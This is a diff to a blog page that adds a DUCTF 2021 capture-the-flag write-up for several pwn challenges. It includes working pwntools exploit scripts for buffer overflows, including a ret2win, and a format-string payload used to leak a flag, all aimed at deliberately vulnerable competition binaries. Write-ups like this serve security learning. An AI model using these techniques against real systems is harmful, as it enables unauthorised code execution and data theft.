@@ -13,10 +13,14 @@
     
     <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="DUCTF"/>
-<meta name="twitter:description" content="DUCTF WriteUp Pwn (4/9) deadcode babygame hellothere "/>
+<meta name="twitter:description" content="DUCTF WriteUp Pwn (4/9) deadcode First things, we have to check file and checksec cmd to make something clearly.
+We can see it a ELF 64bits file, no canary found, no pie,NX enabled (Non-eXecutable). It mean we can use IDA Pro 64bits to read and no canary,no pie, can&rsquo;t execute in stack :D .
+After that, i using IDA Pro 64 bits to read ELF file and can be get source code C like this."/>
 
     <meta property="og:title" content="DUCTF" />
-<meta property="og:description" content="DUCTF WriteUp Pwn (4/9) deadcode babygame hellothere " />
+<meta property="og:description" content="DUCTF WriteUp Pwn (4/9) deadcode First things, we have to check file and checksec cmd to make something clearly.
+We can see it a ELF 64bits file, no canary found, no pie,NX enabled (Non-eXecutable). It mean we can use IDA Pro 64bits to read and no canary,no pie, can&rsquo;t execute in stack :D .
+After that, i using IDA Pro 64 bits to read ELF file and can be get source code C like this." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://datnlq.github.io/posts/ductf/" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2021-09-28T22:03:55+07:00" />
@@ -59,7 +63,7 @@
   <title>clock</title>
   <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
 </svg>
-          1 min read
+          4 min read
         </div>
       </div>
     </header>
@@ -67,8 +71,171 @@
       <h1 id="ductf-writeup">DUCTF WriteUp</h1>
 <h2 id="pwn-49">Pwn (4/9)</h2>
 <h3 id="deadcode">deadcode</h3>
+<p><img src="https://github.com/datnlq/Pwn/blob/main/CTF/DUCTF/images/deadcode_chall.png?raw=true" alt="img">
+First things, we have to check file and checksec cmd to make something clearly.</p>
+<p><img src="https://github.com/datnlq/Pwn/blob/main/CTF/DUCTF/images/deadcode_check.png?raw=true" alt="img"></p>
+<p>We can see it a ELF 64bits file, no canary found, no pie,NX enabled (Non-eXecutable). It mean we can use IDA Pro 64bits to read and no canary,no pie, can&rsquo;t execute in stack :D .</p>
+<p>After that, i using IDA Pro 64 bits to read ELF file and can be get source code C like this.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char v4[24]; // [rsp+0h] [rbp-20h] BYREF
+  __int64 v5; // [rsp+18h] [rbp-8h]
+
+  v5 = 0LL;
+  buffer_init(argc, argv, envp);
+  puts(&#34;\nI&#39;m developing this new application in C, I&#39;ve setup some code for the new features but it&#39;s not (a)live yet.&#34;);
+  puts(&#34;\nWhat features would you like to see in my app?&#34;);
+  gets(v4);
+  if ( v5 == 0xDEADC0DELL )
+  {
+    puts(&#34;\n\nMaybe this code isn&#39;t so dead...&#34;);
+    system(&#34;/bin/sh&#34;);
+  }
+  return 0;
+}
+</code></pre></div><p>I see <em>gets</em> funtion it mean have BufferOverFlow(bof) in there. This program&rsquo;s flow is so ezzzzz. I just bypass condition <em>v5 = 0xDEADC0DE</em> in if condition and i can call system.</p>
+<p>This is a simple chall :&lt;</p>
+<h5 id="exploitttt">Exploitttt</h5>
+<p>I find offset = 24</p>
+<p>Using pwntool convert v5 to little edien</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">from pwn import * 
+
+BIN = &#34;./deadcode&#34;
+
+v5 = 0xDEADC0DE
+
+def exploit():
+	payload = b&#34;a&#34;*24 + p64(v5)
+	io.recvuntil(&#34;What features would you like to see in my app?&#34;)
+	io.sendline(payload)
+	io.interactive()
+
+#io = process(BIN)
+io = remote(&#34;pwn-2021.duc.tf&#34;, 31916)
+exploit()
+</code></pre></div><p><img src="https://github.com/datnlq/Pwn/blob/main/CTF/DUCTF/images/deadcode_catflag.png?raw=true" alt="img"></p>
+<h3 id="leaking-like-a-sieve">Leaking like a sieve</h3>
+<p><img src="https://github.com/datnlq/Pwn/blob/main/CTF/DUCTF/images/hellothere_chall.png?raw=true" alt="img">
+We can see it a ELF 64bits file, no canary found, pie enabled ,NX enabled (Non-eXecutable). It mean we also use IDA Pro 64bits to read.It same the previous chall but different in pie, pie is enabled. That mean code area address will be random .
+<img src="https://github.com/datnlq/Pwn/blob/main/CTF/DUCTF/images/hellothere_check.png?raw=true" alt="img">
+I using IDA Pro 64 bits to read ELF file.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
+{
+  FILE *stream; // [rsp+8h] [rbp-58h]
+  char format[32]; // [rsp+10h] [rbp-50h] BYREF
+  char s[40]; // [rsp+30h] [rbp-30h] BYREF
+  unsigned __int64 v6; // [rsp+58h] [rbp-8h]
+
+  v6 = __readfsqword(0x28u);
+  buffer_init(argc, argv, envp);
+  stream = fopen(&#34;./flag.txt&#34;, &#34;r&#34;);
+  if ( !stream )
+  {
+    puts(&#34;The flag file isn&#39;t loading. Please contact an organiser if you are running this on the shell server.&#34;);
+    exit(0);
+  }
+  fgets(s, 32, stream);
+  while ( 1 )
+  {
+    puts(&#34;What is your name?&#34;);
+    fgets(format, 32, stdin);
+    printf(&#34;\nHello there, &#34;);
+    printf(format);
+    putchar(10);
+  }
+}
+</code></pre></div><p>Read source code and i know flow :</p>
+<ul>
+<li>Read flag in file flag.txt to stream</li>
+<li>Read from stream to s value ==&gt; flag in s value</li>
+<li>Get input into format value</li>
+<li>Print Hello there, + format</li>
+</ul>
+<p>==&gt; I know this is Format string (fmt), so to exploit i have to find offset by payload = %x %x %x %x %x %x %x %x %x %x</p>
+<p><img src="https://github.com/datnlq/Pwn/blob/main/CTF/DUCTF/images/hellothere_findoffset.png?raw=true" alt="img"></p>
+<p>using payload i can get offset = 6 ==&gt; payload =  %6$s to leak flag :))) so ezz right ?</p>
+<p><img src="https://github.com/datnlq/Pwn/blob/main/CTF/DUCTF/images/hellothere_flag.png?raw=true" alt="img"></p>
+<h3 id="outbackdoor">outBackdoor</h3>
+<p><img src="https://github.com/datnlq/Pwn/blob/main/CTF/DUCTF/images/outbd_chall.png?raw=true" alt="img">
+Status of this chall as same as deadcode, so maybe i can call it is version upgraded of deadcode.</p>
+<p>Uisng IDA Pro to analyst :|</p>
+<p><img src="https://github.com/datnlq/Pwn/blob/main/CTF/DUCTF/images/outbd_check.png?raw=true" alt="img"></p>
+<p><img src="https://github.com/datnlq/Pwn/blob/main/CTF/DUCTF/images/outbd_ida.png?raw=true" alt="img"></p>
+<p>Read code i see a normal bof but don&rsquo;t see flag or system funtion. After that, i check all funtion in IDA and i found outBackdoor funtion.</p>
+<p><img src="https://github.com/datnlq/Pwn/blob/main/CTF/DUCTF/images/outbd_system.png?raw=true" alt="img"></p>
+<p>It is a system funtion, it can get shell for me :D . So i using bof to return address of this funtion to call outBackdoor.</p>
+<p>To exploit i find outBackdoor address = 0x4011d7</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"> pwndbg&gt; p outBackdoor 
+$1 = {&lt;text variable, no debug info&gt;} 0x4011d7 &lt;outBackdoor&gt;
+pwndbg&gt; 
+</code></pre></div><p>Offset = 16 + 8(old rbp)</p>
+<p>==&gt; Payload = 16 + 8 + address</p>
+<p>Something, i get some trouble like this, i can get shell in local but i cant get shell in server ?? :D ?? wwhyy ???? WWhat happen to me :| Am i do somethings wwrong?</p>
+<p>In a long time, i see a video teach me that i can be use ret to make it run. So i using ROPgadget to find ret and get it to exploit.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">from pwn import * 
+
+
+BIN = &#34;./outBackdoor&#34;
+outBackdoor = 0x4011d7
+ret = 0x0000000000401016
+
+def exploit():
+	payload = b&#34;a&#34;*16 + b&#34;b&#34;*8 + p64(ret) + p64(outBackdoor)
+	io.recvuntil(&#34;Seriously though, what features would be cool? Maybe it could play a song?&#34;)
+	io.sendline(payload)
+	io.interactive()
+
+#io = process(BIN)
+io = remote(&#34;pwn-2021.duc.tf&#34;, 31921)
+exploit()
+</code></pre></div><p><img src="https://github.com/datnlq/Pwn/blob/main/CTF/DUCTF/images/outbd_flag.png?raw=true" alt="img"></p>
 <h3 id="babygame">babygame</h3>
-<h3 id="hellothere">hellothere</h3>
+<p><img src="https://github.com/datnlq/Pwn/blob/main/CTF/DUCTF/images/babygame.png?raw=true" alt="img"></p>
+<p><img src="https://github.com/datnlq/Pwn/blob/main/CTF/DUCTF/images/babygame_check.png?raw=true" alt="img"></p>
+<p><img src="https://github.com/datnlq/Pwn/blob/main/CTF/DUCTF/images/babygame_ida.png?raw=true" alt="img"></p>
+<p><img src="https://github.com/datnlq/Pwn/blob/main/CTF/DUCTF/images/babygame_getnum.png?raw=true" alt="img"></p>
+<p><img src="https://github.com/datnlq/Pwn/blob/main/CTF/DUCTF/images/babygame_set_user.png?raw=true" alt="img"></p>
+<p><img src="https://github.com/datnlq/Pwn/blob/main/CTF/DUCTF/images/babygame_printuser.png?raw=true" alt="img"></p>
+<p><img src="https://github.com/datnlq/Pwn/blob/main/CTF/DUCTF/images/babygame_game.png?raw=true" alt="img"></p>
+<p><img src="https://github.com/datnlq/Pwn/blob/main/CTF/DUCTF/images/babygame_bytes.png?raw=true" alt="img"></p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">from pwn import *
+
+BIN = &#34;./babygame&#34;
+guess = b&#34;\x7f\x45\x4c\x46&#34; #0xfbad2488 #0x1e8c1e00000055de
+Randpath = b&#34;pwn&#34;
+
+def exploit():
+   payload = b&#34;a&#34;*31
+   io.recvuntil(&#34;Welcome, what is your name?&#34;)
+   io.sendline(payload)
+   io.recvuntil(&#34;&gt; &#34;)
+   io.sendline(b&#34;2&#34;)
+   io.recvline()
+   randadd = int.from_bytes(io.recvline().strip(), byteorder=&#39;little&#39;, signed=False)
+   name = randadd - 32 + 0x209c
+   print(hex(name))
+   payload = Randpath + b&#34;\x00&#34;*(32-len(Randpath)) + p64(name)[0:6]
+   # _breakpoint=&#34;&#34;&#34;
+   # 	b*set_username
+   # 	&#34;&#34;&#34;
+   # gdb.attach(io,_breakpoint)
+   io.recvuntil(&#34;&gt; &#34;)
+   io.sendline(b&#34;1&#34;)
+   io.recvuntil(&#34;What would you like to change your username to?&#34;)
+   io.send(payload)
+   io.recvuntil(&#34;&gt; &#34;)
+   io.sendline(b&#34;1337&#34;)
+   io.recvuntil(&#34;guess: &#34;)
+   io.sendline(&#34;1179403647&#34;)
+   io.interactive()
+
+io = process(BIN)
+io = remote(&#34;pwn-2021.duc.tf&#34;, 31907)
+context.log_level=&#34;debug&#34;
+exploit()
+
+
+</code></pre></div><p><img src="https://github.com/datnlq/Pwn/blob/main/CTF/DUCTF/images/babygame_flag.png?raw=true" alt="img"></p>
 
     </div>
     <div class="post-footer">
